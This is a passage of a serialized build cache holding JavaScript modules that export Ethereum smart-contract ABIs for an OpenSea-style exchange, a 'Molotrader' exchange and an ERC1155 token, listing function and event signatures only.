    { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' },\n      { name: 'orderbookInclusionDesired', type: 'bool' }\n    ],\n    name: 'approveOrder_',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'registry',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'minimumMakerProtocolFee',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' }\n    ],\n    name: 'hashToSign_',\n    outputs: [{ name: '', type: 'bytes32' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: '', type: 'address' }],\n    name: 'nonces',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: '', type: 'bytes32' }],\n    name: 'cancelledOrFinalized',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'owner',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'exchangeToken',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' },\n      { name: 'v', type: 'uint8' },\n      { name: 'r', type: 'bytes32' },\n      { name: 's', type: 'bytes32' }\n    ],\n    name: 'cancelOrder_',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'addrs', type: 'address[14]' },\n      { name: 'uints', type: 'uint256[18]' },\n      { name: 'feeMethodsSidesKindsHowToCalls', type: 'uint8[8]' },\n      { name: 'calldataBuy', type: 'bytes' },\n      { name: 'calldataSell', type: 'bytes' },\n      { name: 'replacementPatternBuy', type: 'bytes' },\n      { name: 'replacementPatternSell', type: 'bytes' },\n      { name: 'staticExtradataBuy', type: 'bytes' },\n      { name: 'staticExtradataSell', type: 'bytes' },\n      { name: 'vs', type: 'uint8[2]' },\n      { name: 'rssMetadata', type: 'bytes32[5]' }\n    ],\n    name: 'atomicMatch_',\n    outputs: [],\n    payable: true,\n    stateMutability: 'payable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' }\n    ],\n    name: 'validateOrderParameters_',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'INVERSE_BASIS_POINT',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[14]' },\n      { name: 'uints', type: 'uint256[18]' },\n      { name: 'feeMethodsSidesKindsHowToCalls', type: 'uint8[8]' },\n      { name: 'calldataBuy', type: 'bytes' },\n      { name: 'calldataSell', type: 'bytes' },\n      { name: 'replacementPatternBuy', type: 'bytes' },\n      { name: 'replacementPatternSell', type: 'bytes' },\n      { name: 'staticExtradataBuy', type: 'bytes' },\n      { name: 'staticExtradataSell', type: 'bytes' }\n    ],\n    name: 'calculateMatchPrice_',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: 'hash', type: 'bytes32' }],\n    name: 'approvedOrders',\n    outputs: [{ name: 'approved', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'newOwner', type: 'address' }],\n    name: 'transferOwnership',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' },\n      { name: 'v', type: 'uint8' },\n      { name: 'r', type: 'bytes32' },\n      { name: 's', type: 'bytes32' },\n      { name: 'nonce', type: 'uint256' }\n    ],\n    name: 'cancelOrderWithNonce_',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { name: 'registryAddress', type: 'address' },\n      { name: 'tokenTransferProxyAddress', type: 'address' },\n      { name: 'tokenAddress', type: 'address' },\n      { name: 'protocolFeeAddress', type: 'address' }\n    ],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'constructor'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'hash', type: 'bytes32' },\n      { indexed: false, name: 'exchange', type: 'address' },\n      { indexed: true, name: 'maker', type: 'address' },\n      { indexed: false, name: 'taker', type: 'address' },\n      { indexed: false, name: 'makerRelayerFee', type: 'uint256' },\n      { indexed: false, name: 'takerRelayerFee', type: 'uint256' },\n      { indexed: false, name: 'makerProtocolFee', type: 'uint256' },\n      { indexed: false, name: 'takerProtocolFee', type: 'uint256' },\n      { indexed: true, name: 'feeRecipient', type: 'address' },\n      { indexed: false, name: 'feeMethod', type: 'uint8' },\n      { indexed: false, name: 'side', type: 'uint8' },\n      { indexed: false, name: 'saleKind', type: 'uint8' },\n      { indexed: false, name: 'target', type: 'address' }\n    ],\n    name: 'OrderApprovedPartOne',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'hash', type: 'bytes32' },\n      { indexed: false, name: 'howToCall', type: 'uint8' },\n      { indexed: false, name: 'calldata', type: 'bytes' },\n      { indexed: false, name: 'replacementPattern', type: 'bytes' },\n      { indexed: false, name: 'staticTarget', type: 'address' },\n      { indexed: false, name: 'staticExtradata', type: 'bytes' },\n      { indexed: false, name: 'paymentToken', type: 'address' },\n      { indexed: false, name: 'basePrice', type: 'uint256' },\n      { indexed: false, name: 'extra', type: 'uint256' },\n      { indexed: false, name: 'listingTime', type: 'uint256' },\n      { indexed: false, name: 'expirationTime', type: 'uint256' },\n      { indexed: false, name: 'salt', type: 'uint256' },\n      { indexed: false, name: 'orderbookInclusionDesired', type: 'bool' }\n    ],\n    name: 'OrderApprovedPartTwo',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [{ indexed: true, name: 'hash', type: 'bytes32' }],\n    name: 'OrderCancelled',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: false, name: 'buyHash', type: 'bytes32' },\n      { indexed: false, name: 'sellHash', type: 'bytes32' },\n      { indexed: true, name: 'maker', type: 'address' },\n      { indexed: true, name: 'taker', type: 'address' },\n      { indexed: false, name: 'price', type: 'uint256' },\n      { indexed: true, name: 'metadata', type: 'bytes32' }\n    ],\n    name: 'OrdersMatched',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'maker', type: 'address' },\n      { indexed: false, name: 'newNonce', type: 'uint256' }\n    ],\n    name: 'NonceIncremented',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [{ indexed: true, name: 'previousOwner', type: 'address' }],\n    name: 'OwnershipRenounced',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'previousOwner', type: 'address' },\n      { indexed: true, name: 'newOwner', type: 'address' }\n    ],\n    name: 'OwnershipTransferred',\n    type: 'event'\n  }\n];\n","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/Exchange.js",["122"],"export default [\n  {\n    inputs: [],\n    stateMutability: 'nonpayable',\n    type: 'constructor'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      {\n        indexed: true,\n        internalType: 'address',\n        name: 'maker',\n        type: 'address'\n      },\n      {\n        indexed: false,\n        internalType: 'uint256',\n        name: 'newNonce',\n        type: 'uint256'\n      }\n    ],\n    name: 'NonceIncremented',\n    type: 'event'\n  },\n  {\n    stateMutability: 'payable',\n    type: 'fallback'\n  },\n  {\n    inputs: [\n      {\n        internalType: 'uint256',\n        name: 'leaf',\n        type: 'uint256'\n      },\n      {\n        internalType: 'bytes32',\n        name: 'root',\n        type: 'bytes32'\n      },\n      {\n        internalType: 'bytes32[]',\n        name: 'proof',\n        type: 'bytes32[]'\n      }\n    ],\n    name: '_verifyProof',\n    outputs: [],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        components: [\n          {\n            internalType: 'address',\n            name: 'collection',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenId',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'signer',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'orderType',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'totalAmt',\n            type: 'uint256'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'exchange',\n            type: 'tuple'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'prePayment',\n            type: 'tuple'\n          },\n          {\n            internalType: 'bool',\n            name: 'isERC721',\n            type: 'bool'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'refererrAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'root',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'address',\n            name: 'reservedAddress',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'nonce',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'deadline',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint8',\n            name: 'v',\n            type: 'uint8'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'r',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'bytes32',\n            name: 's',\n            type: 'bytes32'\n          }\n        ],\n        internalType: 'struct Molotrader.Order',\n        name: 'o',\n        type: 'tuple'\n      }\n    ],\n    name: 'cancelOrder',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'distributor',\n    outputs: [\n      {\n        internalType: 'contract Distributor',\n        name: '',\n        type: 'address'\n      }\n    ],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        components: [\n          {\n            internalType: 'address',\n            name: 'collection',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenId',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'signer',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'orderType',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'totalAmt',\n            type: 'uint256'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'exchange',\n            type: 'tuple'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'prePayment',\n            type: 'tuple'\n          },\n          {\n            internalType: 'bool',\n            name: 'isERC721',\n            type: 'bool'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'refererrAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'root',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'address',\n            name: 'reservedAddress',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'nonce',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'deadline',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint8',\n            name: 'v',\n            type: 'uint8'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'r',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'bytes32',\n            name: 's',\n            type: 'bytes32'\n          }\n        ],\n        internalType: 'struct Molotrader.Order',\n        name: 'o',\n        type: 'tuple'\n      },\n      {\n        internalType: 'uint256',\n        name: 'amount',\n        type: 'uint256'\n      },\n      {\n        internalType: 'address',\n        name: 'referrer',\n        type: 'address'\n      },\n      {\n        components: [\n          {\n            internalType: 'uint256',\n            name: 'paymentAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'paymentAddress',\n            type: 'address'\n          }\n        ],\n        internalType: 'struct Molotrader.Payment',\n        name: 'p',\n        type: 'tuple'\n      }\n    ],\n    name: 'fillAsk',\n    outputs: [],\n    stateMutability: 'payable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        components: [\n          {\n            internalType: 'address',\n            name: 'collection',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenId',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'signer',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'orderType',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'totalAmt',\n            type: 'uint256'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'exchange',\n            type: 'tuple'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'prePayment',\n            type: 'tuple'\n          },\n          {\n            internalType: 'bool',\n            name: 'isERC721',\n            type: 'bool'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'refererrAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'root',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'address',\n            name: 'reservedAddress',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'nonce',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'deadline',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint8',\n            name: 'v',\n            type: 'uint8'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'r',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'bytes32',\n            name: 's',\n            type: 'bytes32'\n          }\n        ],\n        internalType: 'struct Molotrader.Order',\n        name: 'o',\n        type: 'tuple'\n      },\n      {\n        internalType: 'uint256',\n        name: 'amount',\n        type: 'uint256'\n      },\n      {\n        internalType: 'address',\n        name: 'referrer',\n        type: 'address'\n      },\n      {\n        components: [\n          {\n            internalType: 'uint256',\n            name: 'paymentAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'paymentAddress',\n            type: 'address'\n          }\n        ],\n        internalType: 'struct Molotrader.Payment',\n        name: 'p',\n        type: 'tuple'\n      }\n    ],\n    name: 'fillBid',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        components: [\n          {\n            internalType: 'address',\n            name: 'collection',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenId',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'signer',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'orderType',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'totalAmt',\n            type: 'uint256'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'exchange',\n            type: 'tuple'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'prePayment',\n            type: 'tuple'\n          },\n          {\n            internalType: 'bool',\n            name: 'isERC721',\n            type: 'bool'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'refererrAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'root',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'address',\n            name: 'reservedAddress',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'nonce',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'deadline',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint8',\n            name: 'v',\n            type: 'uint8'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'r',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'bytes32',\n            name: 's',\n            type: 'bytes32'\n          }\n        ],\n        internalType: 'struct Molotrader.Order',\n        name: 'o',\n        type: 'tuple'\n      },\n      {\n        internalType: 'uint256',\n        name: 'amount',\n        type: 'uint256'\n      },\n      {\n        internalType: 'uint256',\n        name: 'tokenId',\n        type: 'uint256'\n      },\n      {\n        internalType: 'bytes32[]',\n        name: 'proof',\n        type: 'bytes32[]'\n      },\n      {\n        internalType: 'address',\n        name: 'referrer',\n        type: 'address'\n      },\n      {\n        components: [\n          {\n            internalType: 'uint256',\n            name: 'paymentAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'paymentAddress',\n            type: 'address'\n          }\n        ],\n        internalType: 'struct Molotrader.Payment',\n        name: 'p',\n        type: 'tuple'\n      }\n    ],\n    name: 'fillCriteriaBid',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'incrementNonce',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        internalType: 'address',\n        name: '',\n        type: 'address'\n      }\n    ],\n    name: 'nonces',\n    outputs: [\n      {\n        internalType: 'uint256',\n        name: '',\n        type: 'uint256'\n      }\n    ],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'owner',\n    outputs: [\n      {\n        internalType: 'address',\n        name: '',\n        type: 'address'\n      }\n    ],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        internalType: 'address',\n        name: '_distributor',\n        type: 'address'\n      }\n    ],\n    name: 'setDistributor',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      {\n        components: [\n          {\n            internalType: 'address',\n            name: 'collection',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenId',\n            type: 'uint256'\n          },\n          {\n            internalType: 'address',\n            name: 'signer',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'orderType',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'totalAmt',\n            type: 'uint256'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'exchange',\n            type: 'tuple'\n          },\n          {\n            components: [\n              {\n                internalType: 'uint256',\n                name: 'paymentAmt',\n                type: 'uint256'\n              },\n              {\n                internalType: 'address',\n                name: 'paymentAddress',\n                type: 'address'\n              }\n            ],\n            internalType: 'struct Molotrader.Payment',\n            name: 'prePayment',\n            type: 'tuple'\n          },\n          {\n            internalType: 'bool',\n            name: 'isERC721',\n            type: 'bool'\n          },\n          {\n            internalType: 'uint256',\n            name: 'tokenAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'refererrAmt',\n            type: 'uint256'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'root',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'address',\n            name: 'reservedAddress',\n            type: 'address'\n          },\n          {\n            internalType: 'uint256',\n            name: 'nonce',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint256',\n            name: 'deadline',\n            type: 'uint256'\n          },\n          {\n            internalType: 'uint8',\n            name: 'v',\n            type: 'uint8'\n          },\n          {\n            internalType: 'bytes32',\n            name: 'r',\n            type: 'bytes32'\n          },\n          {\n            internalType: 'bytes32',\n            name: 's',\n            type: 'bytes32'\n          }\n        ],\n        internalType: 'struct Molotrader.Order',\n        name: 'o',\n        type: 'tuple'\n      }\n    ],\n    name: 'validateOrder',\n    outputs: [\n      {\n        internalType: 'uint256',\n        name: '',\n        type: 'uint256'\n      },\n      {\n        internalType: 'bytes32',\n        name: '',\n        type: 'bytes32'\n      },\n      {\n        internalType: 'uint256',\n        name: '',\n        type: 'uint256'\n      }\n    ],\n    stateMutability: 'view',\n    type: 'function'\n  }\n];\n","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/ERC1155.js",["123"],"export default [\n  { inputs: [], stateMutability: 'nonpayable', type: 'constructor' },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'account', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'operator', type: 'address' },\n      { indexed: false, internalType: 'bool', name: 'approved', type: 'bool' }\n    ],\n    name: 'ApprovalForAll',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'previousOwner', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' }\n    ],\n    name: 'OwnershipTransferred',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'operator', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'from', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'to', type: 'address' },\n      { indexed: false, internalType: 'uint256[]', name: 'ids', type: 'uint256[]' },\n      { indexed: false, internalType: 'uint256[]', name: 'values', type: 'uint256[]' }\n    ],\n    name: 'TransferBatch',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'operator', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'from', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'to', type: 'address' },\n      { indexed: false, internalType: 'uint256', name: 'id', type: 'uint256' },\n      { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' }\n    ],\n    name: 'TransferSingle',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: false, internalType: 'string', name: 'value', type: 'string' },\n      { indexed: true, internalType: 'uint256', name: 'id', type: 'uint256' }\n    ],\n    name: 'URI',\n    type: 'event'\n  },\n  {\n    inputs: [{ internalType: 'address', name: 'minter', type: 'address' }],\n    name: 'addMinter',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'account', type: 'address' },\n      { internalType: 'uint256', name: 'id', type: 'uint256' }\n    ],\n    name: 'balanceOf',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address[]', name: 'accounts', type: 'address[]' },\n      { internalType: 'uint256[]', name: 'ids', type: 'uint256[]' }\n    ],\n    name: 'balanceOfBatch',\n    outputs: [{ internalType: 'uint256[]', name: '', type: 'uint256[]' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'account', type: 'address' },\n      { internalType: 'uint256', name: 'id', type: 'uint256' },\n      { internalType: 'uint256', name: 'value', type: 'uint256' }\n    ],\n    name: 'burn',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'count',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    name: 'idToVault',\n    outputs: [{ internalType: 'address', name: '', type: 'address' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'account', type: 'address' },\n      { internalType: 'address', name: 'operator', type: 'address' }\n    ],\n    name: 'isApprovedForAll',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'uint256', name: 'amount', type: 'uint256' },\n      { internalType: 'uint256', name: 'id', type: 'uint256' }\n    ],\n    name: 'mint',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'vault', type: 'address' },\n      { internalType: 'uint256', name: 'amount', type: 'uint256' }\n    ],\n    name: 'mint',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'address', name: '', type: 'address' }],\n    name: 'minters',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'owner',\n    outputs: [{ internalType: 'address', name: '', type: 'address' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'address', name: 'minter', type: 'address' }],\n    name: 'removeMinter',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'renounceOwnership',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'from', type: 'address' },\n      { internalType: 'address', name: 'to', type: 'address' },\n      { internalType: 'uint256[]', name: 'ids', type: 'uint256[]' },\n      { internalType: 'uint256[]', name: 'amounts', type: 'uint256[]' },\n      { internalType: 'bytes', name: 'data', type: 'bytes' }\n    ],\n    name: 'safeBatchTransferFrom',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'from', type: 'address' },\n      { internalType: 'address', name: 'to', type: 'address' },\n      { internalType: 'uint256', name: 'id', type: 'uint256' },\n      { internalType: 'uint256', name: 'amount', type: 'uint256' },\n      { internalType: 'bytes', name: 'data', type: 'bytes' }\n    ],\n    name: 'safeTransferFrom',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'operator', type: 'address' },\n      { internalType: 'bool', name: 'approved', type: 'bool' }\n    ],\n    name: 'setApprovalForAll',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'bytes4', 